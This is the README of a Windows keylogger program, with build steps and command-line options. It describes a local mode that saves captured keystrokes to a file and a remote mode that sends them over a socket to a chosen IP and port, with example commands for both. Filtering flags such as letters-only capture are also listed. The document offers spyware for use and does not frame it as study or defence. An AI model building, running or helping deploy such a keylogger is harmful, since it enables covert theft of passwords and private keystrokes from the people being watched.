BUILD AND RUN FOR WINDOWS ONLY

# Installation

run command make

# Dependencies

[MinGW](http://www.mingw.org) for g++ and command make

# Usage

This program propose 2 type of keylogger

## Parameters

### [REQUIERED] Please, choose one of them

        -l | --local : local keylogger, store data into file on this computer, require 1 argument (destination_file)
                Example : ./bin/main.exe -l D:\file.txt

        -r | --remote : remote keylogger, send data via socket, require 2 arguments (ip, port)
                Example : ./bin/main.exe -r 192.168.1.16 7777

### [OPTIONAL]

        -c | --no_click : don't store click keys (based on ascii)
                Example : ./bin/main.exe ... -c

        -a | --alphabet_only : Store alphabet only, A-z (based on ascii)
                Example : ./bin/main.exe ... -a

        -C | --storage_format_character : Default storage format is int, use this option if you want to store as character
                Example : ./bin/main.exe ... -C

        -h | --help : Show this help
                Example : ./bin/main.exe -h

